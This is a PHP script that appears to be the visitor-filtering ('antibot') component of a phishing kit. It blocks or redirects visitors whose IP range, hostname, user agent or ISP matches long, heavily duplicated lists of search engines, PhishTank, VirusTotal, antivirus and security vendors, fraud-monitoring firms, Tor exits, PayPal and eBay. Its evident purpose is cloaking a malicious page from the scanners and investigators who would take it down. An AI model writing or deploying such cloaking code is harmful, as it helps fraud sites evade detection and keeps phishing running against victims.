<?php
/* ---[ blockip & remote address ]--- */
$blocked_ip = array("66.102.", "38.100.", "107.170.", "149.20.", "38.105.", "74.125.", "66.150.14.", "54.176.", "38.100.", "184.173.", "66.249.", "128.242.", "72.14.192.", "208.65.144.", "74.125.", "209.85.128.", "216.239.32.", "74.125.", "207.126.144.", "173.194.", "64.233.160.", "72.14.192.", "66.102.", "64.18.", "194.52.68.", "194.72.238.", "62.116.207.", "212.50.193.", "69.65.", "50.7.", "131.212.", "46.116.", "62.90.", "89.138.", "82.166.", "85.64.", "85.250.", "89.138.", "93.172.", "109.186.", "194.90.", "212.29.192.", "212.29.224.", "212.143.", "212.150.", "212.235.", "217.132.", "50.97.", "217.132.", "209.85.", "66.205.64.", "204.14.48.", "64.27.2.", "67.15.", "202.108.252.", "193.47.80.", "64.62.136.", "66.221.", "64.62.175.", "198.54.", "192.115.134.", "216.252.167.", "193.253.199.", "69.61.12.", "64.37.103.", "38.144.36.", "64.124.14.", "206.28.72.", "209.73.228.", "158.108.", "168.188.", "66.207.120.", "167.24.", "192.118.48.", "67.209.128.", "12.148.209.", "12.148.196.", "193.220.178.", "68.65.53.71", "198.25.", "64.106.213.", "54.228.218.117", "54.228.218.", "185.28.20.243", "185.28.20.", "217.16.26.166", "217.16.26.", "172.217.4.46", "66.102.", "38.100.", "107.170.", "149.20.", "38.105.", "74.125.", "66.150.14.", "54.176.", "38.100.", "184.173.", "66.249.", "128.242.", "72.14.192.", "208.65.144.", "74.125.", "209.85.128.", "216.239.32.", "74.125.", "207.126.144.", "173.194.", "64.233.160.", "72.14.192.", "66.102.", "64.18.", "194.52.68.", "194.72.238.", "62.116.207.", "212.50.193.", "69.65.", "50.7.", "131.212.", "46.116.", "62.90.", "89.138.", "82.166.", "85.64.", "85.250.", "89.138.", "93.172.", "109.186.", "194.90.", "212.29.192.", "212.29.224.", "212.143.", "212.150.", "212.235.", "217.132.", "50.97.", "217.132.", "209.85.", "66.205.64.", "204.14.48.", "64.27.2.", "67.15.", "202.108.252.", "193.47.80.", "64.62.136.", "66.221.", "64.62.175.", "198.54.", "192.115.134.", "216.252.167.", "193.253.199.", "69.61.12.", "64.37.103.", "38.144.36.", "64.124.14.", "206.28.72.", "209.73.228.", "158.108.", "168.188.", "66.207.120.", "167.24.", "192.118.48.", "67.209.128.", "12.148.209.", "12.148.196.", "193.220.178.", "68.65.53.71", "198.25.", "64.106.213.", "54.228.218.117", "54.228.218.", "185.28.20.243", "185.28.20.", "217.16.26.166", "217.16.26.",	"94.26.", "104.131.", "23.254.", "221.121.", "72.12.", "175.158.", "203.188.", "175.34.", "52.65.", "52.63.", "172.111.", "203.188.", "203.188.", "172.111.", "203.188.", "52.65.", "212.83.", "46.243.", "165.227.", "185.145.", "154.127.", "139.59.", "84.93.", "162.243.", "92.23.", "27.124.", "185.248.", "51.38.", "104.42.", "151.80.", "46.101.", "162.243.", "104.207.", "5.62.", "185.151.", "194.59.", "188.166.", "92.23.", "196.251.", "165.227.", "195.181.", "92.23.", "46.101.", "95.85.", "72.52.96.", "212.8.79.", "62.99.77.", "83.31.118.", "91.231.", "206.207.", "91.231.212.", "62.99.77.", "198.41.243.", "162.158.", "162.158.7.", "162.158.72.", "173.245.55.", "108.162.246.", "162.158.95.", "108.162.215.", "95.108.194.", "141.101.104.", "93.54.82.", "69.164.145.", "194.153.113.", "178.43.117.", "62.141.65.", "83.31.69.", "107.178.195.", "149.20.54.", "85.9.7.", "87.106.251.", "107.178.194.", "124.66.185.", "133.11.204.", "185.2.138.", "188.165.83.", "78.148.13.", "192.232.213.", "1.234.41.", "124.66.185.", "87.106.251.", "176.195.231.", "206.253.226.", "107.20.181.", "188.244.39.", "124.66.185.", "38.74.138.", "124.66.185.", "38.74.138.", "206.253.226.", "1.234.41.", "124.66.185.", "29.115...googleusercontent.com", "google-proxy-64-233--.google.com", "120-188--.resources.indosat.com", "199.30.228.", "94.26.", "95.85.", "72.52.96.", "127.0.0.", "212.8.79.", "62.99.77.", "83.31.118.", "91.231.", "206.207.", "91.231.212.", "62.99.77.", "198.41.243.", "162.158.", "162.158.7.", "162.158.72.", "173.245.55.", "108.162.246.", "162.158.95.", "108.162.215.", "95.108.194.", "141.101.104.", "93.54.82.", "69.164.145.", "194.153.113.", "178.43.117.", "62.141.65.", "83.31.69.", "107.178.195.", "149.20.54.", "85.9.7.", "87.106.251.", "107.178.194.", "124.66.185.", "133.11.204.", "185.2.138.", "188.165.83.", "78.148.13.", "192.232.213.", "1.234.41.", "124.66.185.", "87.106.251.", "176.195.231.", "206.253.226.", "107.20.181.", "188.244.39.", "124.66.185.", "38.74.138.", "124.66.185.", "38.74.138.", "206.253.226.", "1.234.41.", "124.66.185.", "87.106.251.", "85.9.7.", "37.140.188.", "195.128.227.", "38.74.138.", "107.20.181.", "46.4.120.", "107.178.194.", "198.60.236.", "217.74.103.", "92.103.69.", "217.74.103.", "66.211.160.86", "46.244.", "131.120.12.", "157.201.10.", "172.217.", "103.86.99.", "213.100.", "216.58.", "173.194.", "74.125.133.", "66.102.", "66.249.", "209.85.", "216.239.", "64.4.", "65.52.", "131.253.", "157.54.", "207.46.", "207.68.", "8.12.", "66.196.", "66.228.", "67.195.", "68.142.", "72.30.", "74.6.", "98.136.", "202.160.", "209.191.", "66.102.", "38.100.", "107.170.", "149.20.", "38.105.", "74.125.", "66.150.14.", "54.176.", "38.100.", "184.173.", "66.249.", "128.242.", "72.14.192.", "208.65.144.", "74.125.", "209.85.128.", "216.239.32.", "74.125.", "207.126.144.", "173.194.", "72.14.192.", "66.102.", "64.18.", "194.52.68.", "194.72.238.", "62.116.207.", "212.50.193.", "69.65.", "50.7.", "131.212.", "46.116.", "62.90.", "89.138.", "82.166.", "85.64.", "85.250.", "89.138.", "93.172.", "109.186.", "194.90.", "115.112.", "212.29.192.", "212.29.224.", "212.143.", "212.150.", "212.235.", "217.132.", "50.97.", "217.132.", "209.85.", "66.205.64.", "204.14.48.", "64.27.2.", "67.15.", "202.108.252.", "193.47.80.", "64.62.136.", "66.221.", "64.62.175.", "198.54.", "192.115.134.", "216.252.167.", "193.253.199.", "69.61.12.", "64.37.103.", "38.144.36.", "64.124.14.", "206.28.72.", "209.73.228.", "158.108.", "168.188.", "66.207.120.", "167.24.", "192.118.48.", "67.209.128.", "12.148.209.", "12.148.196.", "193.220.178.", "68.65.53.71", "198.25.", "64.106.213.", "184.165.", "198.68.61.", "199.3.10.", "204.119.24.", "204.251.90.", "100.43.", "72.94.249.", "103.6.76.", "106.12.", "115.231.36.", "5.189.", "66.102.6.", "66.249.", "173.252.", "196.23.168.", "190.82.81.", "92.189.25.", "52.31.147.", "69.164.111.", "173.252.86.", "173.239.", "203.215.181.", "208.43.225.", "173.192.", "212.113.37.", "119.63.", "188.207.200.", "89.108.102.", "173.11.97.", "209.185.108.", "209.185.253.", "216.239.", "64.68.", "66.249.", "72.14.199.", "8.6.48.", "141.185.209.", "169.207.238.", "202.160.", "195.211.", "185.41.162.", "51.15.", "84.51.153.", "185.220.101.", "40.85.158.", "217.96.", "66.102.", "38.100.", "107.170.", "149.20.", "38.105.", "74.125.", "66.150.14.", "54.176.", "38.100.", "184.173.", "66.249.", "128.242.", "72.14.192.", "208.65.144.", "74.125.", "209.85.128.", "216.239.32.", "74.125.", "207.126.144.", "173.194.", "64.233.160.", "72.14.192.", "66.102.", "64.18.", "194.52.68.", "194.72.238.", "62.116.207.", "212.50.193.", "69.65.", "50.7.", "131.212.", "46.116.", "62.90.", "89.138.", "82.166.", "85.64.", "85.250.", "89.138.", "93.172.", "109.186.", "194.90.", "212.29.192.", "212.29.224.", "212.143.", "212.150.", "212.235.", "217.132.", "50.97.", "217.132.", "209.85.", "66.205.64.", "204.14.48.", "64.27.2.", "67.15.", "202.108.252.", "193.47.80.", "64.62.136.", "66.221.", "64.62.175.", "198.54.", "192.115.134.", "216.252.167.", "193.253.199.", "69.61.12.", "64.37.103.", "38.144.36.", "64.124.14.", "206.28.72.", "209.73.228.", "158.108.", "168.188.", "66.207.120.", "167.24.", "192.118.48.", "67.209.128.", "12.148.209.", "12.148.196.", "193.220.178.", "68.65.53.71", "198.25.", "64.106.213.", "66.102.", "38.100.", "107.170.", "149.20.", "38.105.", "74.125.", "66.150.14.", "54.176.", "38.100.", "184.173.", "66.249.", "128.242.", "72.14.192.", "208.65.144.", "74.125.", "209.85.128.", "216.239.32.", "74.125.", "207.126.144.", "173.194.", "64.233.160.", "72.14.192.", "66.102.", "64.18.", "194.52.68.", "194.72.238.", "62.116.207.", "212.50.193.", "69.65.", "50.7.", "131.212.", "46.116.", "62.90.", "89.138.", "82.166.", "85.64.", "85.250.", "89.138.", "93.172.", "109.186.", "194.90.", "212.29.192.", "212.29.224.", "212.143.", "212.150.", "212.235.", "217.132.", "50.97.", "217.132.", "209.85.", "66.205.64.", "204.14.48.", "64.27.2.", "67.15.", "202.108.252.", "193.47.80.", "64.62.136.", "66.221.", "64.62.175.", "198.54.", "192.115.134.", "216.252.167.", "193.253.199.", "69.61.12.", "64.37.103.", "38.144.36.", "64.124.14.", "206.28.72.", "209.73.228.", "158.108.", "168.188.", "66.207.120.", "167.24.", "192.118.48.", "168.1.66.", "173.254.216.", "104.131.165.", "193.90.12.", "204.228.228.", "109.201.154.", "78.146.123.", "52.62.204.", "65.19.167.", "104.131.157.", "62.149.225.", "162.247.72.", "216.111.93.", "204.228.228.", "46.244.10.", "208.101.244.", "65.103.220.", "95.85.8.", "64.233.172.", "178.217.187.", "207.70.56.", "109.103.227.", "66.249.88.", "37.134.198.", "192.118.48.", "67.209.128.", "12.148.209.", "12.148.196.", "193.220.178.", "68.65.53.71", "198.25.", "64.106.213.", "81.161.59.", "66.135.200.", "66.102.", "38.100.", "107.170.", "149.20.", "38.105.", "74.125.", "66.150.14.", "54.176.", "38.100.", "184.173.", "66.249.", "128.242.", "72.14.192.", "208.65.144.", "74.125.", "209.85.128.", "216.239.32.", "74.125.", "207.126.144.", "173.194.", "64.233.160.", "72.14.192.", "66.102.", "64.18.", "194.52.68.", "194.72.238.", "62.116.207.", "212.50.193.", "69.65.", "50.7.", "131.212.", "46.116.", "62.90.", "89.138.", "82.166.", "85.64.", "85.250.", "89.138.", "93.172.", "109.186.", "194.90.", "212.29.192.", "212.29.224.", "212.143.", "212.150.", "212.235.", "217.132.", "50.97.", "217.132.", "209.85.", "66.205.64.", "204.14.48.", "64.27.2.", "67.15.", "202.108.252.", "193.47.80.", "64.62.136.", "66.221.", "64.62.175.", "198.54.", "192.115.134.", "216.252.167.", "193.253.199.", "69.61.12.", "64.37.103.", "38.144.36.", "64.124.14.", "206.28.72.", "209.73.228.", "158.108.", "168.188.", "66.207.120.", "167.24.", "192.118.48.", "67.209.128.", "12.148.209.", "12.148.196.", "193.220.178.", "68.65.53.71", "198.25.", "64.106.213.", "91.103.66.", "208.91.115.", "199.30.228.", "114.119.141.", "40.77.167.", "52.7.99.", "35.243.23.", "139.162.", "74.125.212.", "52.65.88.", "23.128.248.", "155.254.29.", "103.14.143.", "169.63.92.", "51.83.243.", "192.30.83.", "54.39.193.", "62.67.194.");
$ip = $_SERVER['REMOTE_ADDR'];
foreach($blocked_ip as $ips) {
   if (substr_count($ip, $ips) > 0) {
      header("HTTP/1.0 404 Not Found");
		exit();
	}
}
/* ---[ end ]--- */

/* ---[ block host & ua ]--- */
$blocked_words = array("netpilot.net", "ip11.ip", "ip11.ip-54-39-193.net", "IP-Static-VISPERAD.COM", "ip163.ip", "ip4.static.sl-reverse.com", "ip.cis.gen.nz", "mail.ipqualityscore.com", "ip.cis.gen", "tor-project-exit", "scan", "fraud", "fraudwatchinternational.com", "vps.ovh.net", "rnd.group-ib.com", "semrush", "pentest", "app.pentest-tools", "virustotalcloud", "googleusercontent", "AppEngine-Google", "msnbot", "msn.com", "petalsearch", "TelegramBot", "petalbot", "bot", "above", "google", "docomo", "mediapartners", "phantomjs", "lighthouse", "reverseshorturl", "samsung-sgh-e250", "softlayer", "amazonaws", "cyveillance", "crawler", "gsa-crawler", "phishtank", "dreamhost", "netpilot", "calyxinstitute", "tor-exit", "apache-httpclient", "lssrocketcrawler", "crawler", "urlredirectresolver", "jetbrains", "spam", "windows 95", "windows 98", "acunetix", "netsparker", "007ac9", "008", "Feedfetcher", "192.comagent", "200pleasebot", "360spider", "4seohuntbot", "50.nu", "a6-indexer", "admantx", "amznkassocbot", "aboundexbot", "aboutusbot", "abrave spider", "accelobot", "acoonbot", "addthis.com", "adsbot-google", "ahrefsbot", "alexabot", "amagit.com", "analytics", "antbot", "apercite", "aportworm", "EBAY", "CL0NA", "jabber", "ebay", "arabot", "hotmail!", "msn!", "baidu", "outlook!", "outlook", "msn", "duckduckbot", "hotmail", "go-http-client", "go-http-client/1.1", "trident", "presto", "virustotal", "unchaos", "dreampassport", "sygol", "nutch", "privoxy", "zipcommander", "neofonie", "abacho", "acoi", "acoon", "adaxas", "agada", "aladin", "alkaline", "amibot", "anonymizer", "aplix", "aspseek", "avant", "baboom", "anzwers", "anzwerscrawl", "crawlconvera", "del.icio.us", "camehttps", "annotate", "wapproxy", "translate", "feedfetcher", "ask24", "asked", "askaboutoil", "fangcrawl", "amzn_assoc", "bingpreview", "dr.web", "drweb", "bilbo", "blackwidow", "sogou", "sogou-test-spider", "exabot", "externalhit", "ia_archiver", "googletranslate", "translate", "proxy", "dalvik", "quicklook", "seamonkey", "sylera", "safebrowsing", "safesurfingwidget", "preview", "whatsapp", "telegram", "instagram", "zteopen", "icoreservice", "untrusted", "abot", "dbot", "ebot", "hbot", "kbot", "lbot", "mbot", "nbot", "obot", "pbot", "rbot", "sbot", "tbot", "vbot", "ybot", "zbot", "bot.", "bot/", "_bot", ".bot", "/bot", "-bot", ":bot", "(bot", "crawl", "slurp", "spider", "seek", "avg", "avira", "bitdefender", "kaspersky", "sophos", "virustotal", "virus", "accoona", "acoon", "adressendeutschland", "ah-ha.com", "ahoy", "altavista", "ananzi", "anthill", "appie", "arachnophilia", "arale", "araneo", "aranha", "architext", "aretha", "arks", "asterias", "atlocal", "atn", "atomz", "augurfind", "backrub", "bannana_bot", "baypup", "bdfetch", "big brother", "biglotron", "bjaaland", "blackwidow", "blaiz", "bresult", "blo.", "bloodhound", "boitho", "booch", "bradley", "butterfly", "calif", "cassandra", "ccubee", "cfetch", "charlotte", "churl", "cienciaficcion", "cmc", "collective", "comagent", "combine", "computingsite", "csci", "curl", "cusco", "daumoa", "deepindex", "delorie", "depspid", "deweb", "die blinde kuh", "digger", "ditto", "dmoz", "docomo", "download express", "dtaagent", "dwcp", "ebiness", "ebingbong", "e-collector", "ejupiter", "emacs-w3 search engine", "esther", "evliya celebi", "ezresult", "falcon", "felix ide", "ferret", "fetchrover", "fido", "findlinks", "fireball", "fish search", "fouineur", "funnelweb", "gazz", "gcreep", "genieknows", "getterroboplus", "geturl", "glx", "goforit", "golem", "grabber", "grapnel", "gralon", "griffon", "gromit", "grub", "gulliver", "hamahakki", "harvest", "havindex", "helix", "heritrix", "hku www octopus", "homerweb", "htdig", "html index", "html_analyzer", "htmlgobble", "hubater", "hyper-decontextualizer", "ia_archiver", "ibm_planetwide", "ichiro", "iconsurf", "iltrovatore", "image.kapsi.net", "imagelock", "incywincy", "indexer", "infobee", "informant", "ingrid", "inktomisearch.com", "inspector web", "intelliagent", "internet shinchakubin", "ip3000", "iron33", "israeli-search", "ivia", "jack", "jakarta", "javabee", "jetbot", "jumpstation", "katipo", "kdd-explorer", "kilroy", "knowledge", "kototoi", "kretrieve", "labelgrabber", "lachesis", "larbin", "legs", "libwww", "linkalarm", "link validator", "linkscan", "lockon", "lwp", "lycos", "magpie", "mantraagent", "mapoftheinternet", "marvin/", "mattie", "mediafox", "mediapartners", "mercator", "merzscope", "microsoft url control", "minirank", "miva", "mj12", "mnogosearch", "moget", "monster", "moose", "motor", "multitext", "muncher", "muscatferret", "mwd.search", "myweb", "najdi", "nameprotect", "nationaldirectory", "nazilla", "ncsa beta", "nec-meshexplorer", "nederland.zoek", "netcarta webmap engine", "netmechanic", "netresearchserver", "netscoop", "newscan-online", "nhse", "nokia6682/", "nomad", "noyona", "siteexplorer", "nutch", "nzexplorer", "objectssearch", "occam", "omni", "open text", "openfind", "openintelligencedata", "orb search", "osis-project", "pack rat", "pageboy", "pagebull", "page_verifier", "panscient", "parasite", "partnersite", "patric", "pear.", "pegasus", "peregrinator", "pgp key agent", "phantom", "phpdig", "picosearch", "piltdownman", "pimptrain", "pinpoint", "pioneer", "piranha", "plumtreewebaccessor", "pogodak", "poirot", "pompos", "poppelsdorf", "poppi", "popular iconoclast", "psycheclone", "publisher", "python", "rambler", "raven search", "roach", "road runner", "roadhouse", "robbie", "robofox", "robozilla", "rules", "salty", "sbider", "scooter", "scoutjet", "scrubby", "search.", "searchprocess", "semanticdiscovery", "senrigan", "sg-scout", "shai'hulud", "shark", "shopwiki", "sidewinder", "sift", "silk", "simmany", "site searcher", "site valet", "sitetech-rover", "skymob.com", "sleek", "smartwit", "sna-", "snappy", "snooper", "sohu", "speedfind", "sphere", "sphider", "spinner", "spyder", "steeler/", "suke", "suntek", "supersnooper", "surfnomore", "sven", "sygol", "szukacz", "tach black widow", "tarantula", "templeton", "/teoma", "t-h-u-n-d-e-r-s-t-o-n-e", "theophrastus", "titan", "titin", "tkwww", "toutatis", "t-rex", "tutorgig", "twiceler", "twisted", "ucsd", "udmsearch", "url check", "updated", "vagabondo", "valkyrie", "verticrawl", "victoria", "vision-search", "volcano", "voyager/", "voyager-hc", "w3c_validator", "w3m2", "w3mir", "walker", "wallpaper", "wanderer", "wauuu", "wavefire", "web core", "web hopper", "web wombat", "webbandit", "webcatcher", "webcopy", "webfoot", "weblayers", "weblinker", "webresult monitor", "webmirror", "webmonkey", "webquest", "webreaper", "websitepulse", "websnarf", "webstolperer", "webvac", "webwalk", "webwatch", "webwombat", "webzinger", "wget", "whizbang", "whowhere", "wild ferret", "worldlight", "wwwc", "wwwster", "xenu", "xget", "xift", "xirq", "yandex", "yanga", "yeti", "yodao", "zao/", "zippp", "zyborg", "proximic", "Googlebot", "Baiduspider", "Cliqzbot", "A6-Indexer", "AhrefsBot", "Genieo", "BomboraBot", "CCBot", "URLAppendBot", "DomainAppender", "msnbot-media", "Antivirus", "YoudaoBot", "MJ12bot", "linkdexbot", "Go-http-client", "presto", "BingPreview", "go-http-client", "go-http-client/1.1", "trident", "presto", "virustotal", "unchaos", "dreampassport", "sygol", "nutch", "privoxy", "zipcommander", "neofonie", "abacho", "acoi", "acoon", "adaxas", "agada", "aladin", "alkaline", "amibot", "anonymizer", "aplix", "aspseek", "avant", "baboom", "anzwers", "anzwerscrawl", "crawlconvera", "del.icio.us", "camehttps", "annotate", "wapproxy", "translate", "feedfetcher", "ask24", "asked", "askaboutoil", "fangcrawl", "amzn_assoc", "bingpreview", "dr.web", "drweb", "bilbo", "blackwidow", "sogou", "sogou-test-spider", "exabot", "externalhit", "ia_archiver", "mj12", "okhttp", "simplepie", "curl", "wget", "virus", "pipes", "antivirus", "python", "ruby", "avast", "firebird", "scmguard", "adsbot", "weblight", "favicon", "analytics", "insights", "headless", "github", "node", "agusescan", "zteopen", "majestic12", "SimplePie", "SAMSUNG-SGH-E250", "DoCoMo/2.0 N905i", "SiteLockSpider", "okhttp/2.5.0", "ips-agent", "scoutjet", "UptimeRobot", "FM Scene", "Prevx", "WindowsPowerShell");
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$ua = $_SERVER['HTTP_USER_AGENT'];
foreach($blocked_words as $word) {
   if(substr_count($hostname, $word) > 0 || substr_count($ua, $word) >0) {
      header("HTTP/1.0 503 Internal Service Error");
		exit();
	}
}
/*
foreach($blocked_words as $word){
if(substr_count($ua,$word)>0){
header("HTTP/1.0 503 Internal Service Error");
		exit();
	}
}
*/
/* ---[ end ]--- */

/* ---[ getisp ]--- */
$blocked_isp = array("net4sec", "Cia Triad Security LLC", "IP Volume inc", "AMAZON", "GOOGLE", "MICROSOFT", "Telegram Messenger Inc", "Peak 10", "M247 Ltd", "Quasi Networks LTD", "SC Rusnano", "GoDaddy.com, LLC", "Server Plan S.r.l.", "Linode", "Blazing SEO", "Lixux OU", "Inter Connects Inc", "Flokinet Ltd", "LukMAN Multimedia Sp. z o.o", "PIPEX-BLOCK1", "IPVanish", "LinkGrid LLC", "Snab-Inform Private Enterprise", "Cisco Systems", "Network and Information Technoresulty Limited", "London Wires Ltd.", "Tehnoresultii Budushego LLC", "Eonix Corporation", "hosttech GmbH", "Wowrack.com", "SunGard Availability Services LP", "Internap Network Services Corporation", "Palo Alto Networks", "PlusNet Technoresulties Ltd", "Scaleway", "Facebook", "Host1Plus", "XO Communications", "Nobis Technoresulty Group", "ExpressVPN", "DME Hosting LLC", "Prescient Software", "Sungard Network Solutions", "OVH SAS", "Iomart Hosting Ltd", "Hosting Solution", "Barracuda Networks", "Sungard Network Solutions", "Solar VPS", "PHPNET Hosting Services", "DigitalOcean", "Level 3 Communications", "softlayer", "Chelyabinsk-Signal LLC", "SoftLayer Technoresulties", "Complete Internet Access", "london-tor.mooo.com", "amazonaws", "cyveillance", "phishtank", "tor.piratenpartei-nrw.de", "cpanel66.proisp.no", "tor-node.com", "dreamhost", "Involta", "exit0.liskov.tor-relays.net", "tor.tocici.com", "netpilot", "calyxinstitute", "tor-exit", "msnbot", "p3pwgdsn", "netcraft", "University of Virginia", "trendmicro", "ebay", "paypal", "torservers", "comodo", "EGIHosting", "ebbs.healingpathsolutions.com", "healingpathsolutions.com", "Solution Pro", "Zayo Bandwidth", "spider.clicktargetdevelopment.com", "clicktargetdevelopment.com", "static.spro.net", "Digital Ocean", "Internap Network Services Corporation", "Blue Coat Systems", "GANDI SAS", "roamsite.com", "PIPEX-BLOCK1", "ColoUp", "Westnet", "The University of Tokyo", "University", "University of", "QuadraNet", "exit-01a.noisetor.net", "noisetor.net", "noisetor", "vultr.com", "Zscaler", "Choopa", "RedSwitches Pty", "Quintex Alliance Consulting", "www16.mailshell.com", "this.is.a.tor.exit-node.net", "this.is.a.tor.node.xmission.com", "colocrossing.com", "DedFiberCo", "crawl", "sucuri.net", "crawler", "proxy", "enom", "cloudflare", "yahoo", "trustwave", "rima-tde.net", "tfbnw.net", "pacbell.net", "tpnet.pl", "ovh.net", "centralnic", "badware", "phishing", "antivirus", "SiteAdvisor", "McAfee", "Bitdefender", "avirasoft", "phishtank.com", "googleusercontent", "OVH SAS", "Yahoo", "Yahoo! Inc.", "Google", "Google Inc.", "GoDaddy", "Amazon Technoresulties Inc.", "Amazon", "Top Level Hosting SRL", "Twitter", "Microsoft", "Microsoft Corporation", "OVH", "VPSmalaysia.com.my", "Madgenius.com", "Barracuda Networks Inc.", "Barracuda", "SecuredConnectivity.net", "Digital Domain", "Hetzner Online", "Akamai", "SoftLayer", "SURFnet", "Creative Thought Inc.", "Fastly", "Return Path Inc.", "WhatsApp", "Instagram", "Schulte Consulting LLC", "Universidade Federal do Rio de Janeiro", "Sectoor", "Bitfolk", "DIR A/S", "Team Technoresulties LLC", "Mainloop", "Junk Email Filter Inc.", "Art Matrix - Lightlink Inc.", "Redpill Linpro AS", "CloudFlare", "ESET spol. s r.o.", "AVAST Software s.r.o.", "Dosarrest", "Apple Inc.", "Symantec", "Mozilla", "Netprotect SRL", "Host Europe GmbH", "Host Sailor Ltd.", "PSINet Inc.", "Daniel James Austin", "RamNode", "Hostalia", "Xs4all Internet BV", "Inktomi Corporation", "Eircom Customer Assignment", "9New Network Inc", "Sony", "Private IP Address LAN", "Computer Problem Solving", "Fortinet", "Avira", "Rackspace", "Baidu", "Comodo", "Incapsula Inc", "Orange Polska Spolka Akcyjna", "Infosphere", "Private Customer", "SurfControl", "University of Newcastle upon Tyne", "Total Server Solutions", "LukMAN", "eSecureData", "Hosting", "VI Na Host Co. Ltd", "B2 Net Solutions", "Master Internet", "Global Perfomance", "Fireeye", "AntiVirus", "Security", "Intersoft Internet", "Voxility", "Linode", "Internet-Pro", "Trustwave Holdings Inc", "Online SAS", "Versaweb", "Liquid Web", "A100 ROW", "Apexis AG", "Apexis", "resulticWeb", "Virtual1 Limited", "VNET a.s.", "Static IP Assignment", "TerraTransit AG", "Merit Network", "PathsConnect", "Long Thrive", "LG DACOM", "Secure Internet", "Kaspersky", "UK Dedicated Servers Limited", "Customer Network", "Flokinet", "Simpli Networks LLC", "Psychz", "PrivateSystems Networks", "ScanSafe Services", "CachedNet", "CloudVPN", "Spark New Zealand Trading Ltd", "Whitelabel IT Solutions Corp", "Hostwinds", "Hosteros LLC", "HostUS", "Host", "ClientID", "Server", "Oracle", "Fortinet", "Unus Inc.", "Public facing services", "Virtual Employee Pvt Ltd", "Dataline Ltd", "Teksavvy Solutions Inc.", "UPC Romania Bucuresti", "TalkTalk Communications Limited", "British Telecommunications PLC", "Global Data Networks LLC", "Quintex Alliance Consulting", "Online S.A.S.", "Content Delivery Network Ltd", "Nobis Technoresulty Group LLC", "Parrukatu", "JSC ER-Telecom Holding", "ChinaNet Fujian Province Network", "QualityNetwork", "Vist On-Line Ltd", "The Calyx Institute", "Internet Customers", "OJSC Oao Tattelecom", "Petersburg Internet Network Ltd.", "Psychz Networks", "Udasha", "Onavo Mobile Ltd", "Cubenode System SL", "OVH Hosting Inc.", "NForce Entertainment B.V.", "DigitalOcean LLC", "Glenayre Electronics Inc.", "British Telecommunications PLC", "Iomart Hosting Limited", "Digital Energy Technoresulties Limited", "Private Customer", "Cisco Systems Inc.", "Vultr Holdings LLC", "Amazon.com Inc.", "Web Hosting Solutions", "Time Warner Cable Internet LLC", "Internet Security - TC", "Vertical Telecoms Broadband Networks and Internet Provider", "Ventelo Wholesale", "MYX Group LLC", "France Telecom S.A.", "Online S.A.S.", "Nine Internet Solutions AG", "Microsoft Azure", "Choopa, LLC", "Amazon", "HighWinds Network", "Amazon.com", "Bell Canada", "Digital Ocean", "M247 LTD Frankfurt Infrastructure", "Palo Alto Networks", "Spectrum", "ImOn Communications, LLC", "Wintek Corporation", "ServerMania", "Claro Dominican Republic", "013 NetVision", "Amazon.com", "Digital Ocean", "TalkTalk", "HostDime.com", "AVAST Software s.r.o.", "Host1Plus Cloud Servers", "Amazon Data Services NoVa", "Google Cloud", "M-net", "Digiweb ltd", "Prescient Software", "Eir Broadband", "Solution Pro", "Bell Canada", "Linode", "DigitalOcean", "Plusnet", "GigeNET", "ZenLayer", "NFOrce Entertainment B.V.", "NewMedia Express", "Telegram Messenger Network", "IQ PL Sp. z o.o.", "Datacamp Limited", "Tahoe Internet Exchange (TahoeIX)", "ITCOM Shpk", "HEG US");
$ip = $_SERVER['REMOTE_ADDR'];
$isp = file_get_contents("https://ipapi.co/" . $ip . "/org");
foreach($blocked_isp as $list) {
   if (substr_count($isp, $list) > 0) {
      header("Location: https://www.google.com");
		exit();
	}
}
/*---[end]---*/

/* $_SERVER['HTTP_REFERER']
gagawinkopalang.tinatamadakoeh */
?>
